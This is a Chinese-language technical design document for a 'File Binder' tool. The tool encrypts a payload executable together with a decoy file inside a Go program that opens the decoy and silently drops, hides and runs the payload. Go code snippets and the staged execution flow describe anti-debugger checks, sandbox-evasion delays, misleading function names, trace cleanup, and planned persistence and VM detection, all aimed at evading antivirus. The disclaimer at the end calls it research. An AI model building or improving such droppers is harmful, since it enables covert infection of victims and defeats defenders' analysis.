# 技术原理详解

本文档详细说明File Binder的技术实现原理和免杀机制。

## 🏗️ 整体架构

### 构建阶段架构

```
输入文件 → 加密处理 → 模板嵌入 → 代码生成 → 自动编译 → 可执行文件
   ↓           ↓           ↓           ↓           ↓
Payload.exe  AES-GCM    Go模板     完整源码    README.exe
普通文件    随机密钥    数据替换    编译参数    (最终产物)
```

### 运行时架构

```
启动 → 环境检测 → 路径生成 → 文件解密 → 异步执行 → 痕迹清理
 ↓       ↓         ↓         ↓         ↓         ↓
反调试   行为模拟   随机目录   AES解密   分离操作   自动清理
```

## 🔐 加密机制

### AES-GCM算法

File Binder使用AES-GCM（Galois/Counter Mode）算法，提供：

- **机密性**：数据加密保护
- **完整性**：防篡改验证
- **认证性**：确保数据来源

### 密钥生成

```go
// 使用加密安全的随机数生成器
func GenerateRandomString(length int) (string, error) {
    bytes := make([]byte, length)
    _, err := rand.Read(bytes)  // crypto/rand
    if err != nil {
        return "", err
    }
    return hex.EncodeToString(bytes)[:length], nil
}
```

### 加密流程

1. **密钥生成**：32字节随机密钥（256位）
2. **文件读取**：读取payload和普通文件
3. **分别加密**：使用同一密钥分别加密两个文件
4. **Base64编码**：加密结果转换为Base64字符串
5. **模板嵌入**：将加密数据嵌入Go代码模板

## 🛡️ 免杀技术详解

### 1. 反调试检测

```go
func checkEnvironment() bool {
    // 检查调试器进程
    debuggerProcs := []string{"x64dbg", "ollydbg", "ida", "windbg"}
    for _, proc := range debuggerProcs {
        if _, err := exec.LookPath(proc); err == nil {
            return false  // 发现调试器，退出
        }
    }
    return true
}
```

**检测原理**：
- 通过`exec.LookPath`检查系统PATH中是否存在调试器
- 支持检测主流调试器：x64dbg、OllyDbg、IDA Pro、WinDbg
- 发现调试器立即退出，避免被分析

### 2. 行为模拟

```go
func normalBehavior() {
    // 随机延迟，模拟正常程序启动
    time.Sleep(time.Duration(100+generateRandomDelay()) * time.Millisecond)
    
    // 执行正常的系统调用
    os.Getwd()
    os.Getenv("PATH")
}
```

**目的**：
- 模拟正常程序的启动行为
- 增加沙箱分析的时间成本
- 避免异常的即时执行特征

### 3. 动态路径生成

#### 路径生成算法

```go
// 获取环境变量
userProfile := os.Getenv("USERPROFILE")
if userProfile == "" {
    userProfile = os.Getenv("TEMP")
}

// 生成随机组件
randomDir, _ := generateRandomString(6)   // 6位目录名
randomName, _ := generateRandomString(8)  // 8位文件名

// 构建完整路径
payloadDir := filepath.Join(userProfile, randomDir)
payloadPath := filepath.Join(payloadDir, randomName+".exe")
```

#### 随机性分析

- **目录名**：26^6 = 308,915,776种可能
- **文件名**：26^8 = 208,827,064,576种可能
- **总组合**：约6.4 × 10^16种路径组合

### 4. 函数名混淆

| 原始名称 | 混淆后名称 | 作用 |
|----------|------------|------|
| `selfDelete` | `cleanupTemp` | 文件删除 |
| `setHidden` | `setFileAttribs` | 设置属性 |
| `executePayload` | `normalBehavior` | 执行逻辑 |

### 5. 异步执行机制

```go
// 使用channel同步
payloadDone := make(chan bool, 1)

go func() {
    defer func() { payloadDone <- true }()
    
    // 延迟执行
    time.Sleep(2 * time.Second)
    
    // 分步操作
    // 1. 创建文件
    // 2. 延迟500ms
    // 3. 设置属性
    // 4. 延迟1s
    // 5. 执行payload
}()

// 主程序等待
select {
case <-payloadDone:
    time.Sleep(5 * time.Second)
case <-time.After(15 * time.Second):
    // 超时保护
}
```

## 🔄 执行流程详解

### 第一阶段：环境检测（0-1秒）

1. **反调试检查**：检测调试器进程
2. **环境模拟**：执行正常系统调用
3. **随机延迟**：100-600毫秒延迟

### 第二阶段：路径准备（1-2秒）

1. **获取环境变量**：USERPROFILE或TEMP
2. **生成随机字符串**：目录名和文件名
3. **创建目录结构**：在用户目录下创建随机子目录
4. **准备临时路径**：用于自身副本移动

### 第三阶段：文件处理（2-4秒）

1. **解密普通文件**：AES-GCM解密
2. **释放到当前目录**：保持原文件名
3. **自动打开**：调用系统默认程序
4. **移动自身**：创建临时副本

### 第四阶段：Payload执行（4-6秒）

1. **解密payload**：AES-GCM解密
2. **写入随机路径**：用户目录下的随机位置
3. **设置文件属性**：隐藏属性
4. **异步执行**：启动payload进程

### 第五阶段：清理工作（6-15秒）

1. **延迟清理**：3秒后开始清理
2. **删除临时文件**：使用goroutine异步删除
3. **程序退出**：主程序正常退出

## 🎯 免杀效果分析

### 静态检测规避

- **字符串混淆**：无硬编码敏感字符串
- **函数命名**：使用无害的函数名
- **代码结构**：符合正常Go程序结构
- **编译选项**：使用标准编译参数

### 动态检测规避

- **行为延迟**：避免立即执行特征
- **路径随机**：每次运行路径不同
- **分离执行**：时间和空间分离
- **环境适应**：智能处理不同环境

### 沙箱规避

- **时间消耗**：增加分析时间成本
- **环境检测**：识别分析环境
- **正常行为**：模拟合法程序
- **资源消耗**：适度的系统资源使用

## 🔧 技术改进空间

### 可扩展功能

1. **多层加密**：支持嵌套加密
2. **网络通信**：添加远程配置
3. **持久化**：增加持久化机制
4. **多平台**：扩展到Linux/macOS

### 安全增强

1. **更多反调试**：硬件断点检测
2. **虚拟机检测**：VM环境识别
3. **网络检测**：识别分析网络
4. **时间检测**：系统时间验证

---

**注意**: 本文档仅用于技术学习和安全研究，请遵守相关法律法规。
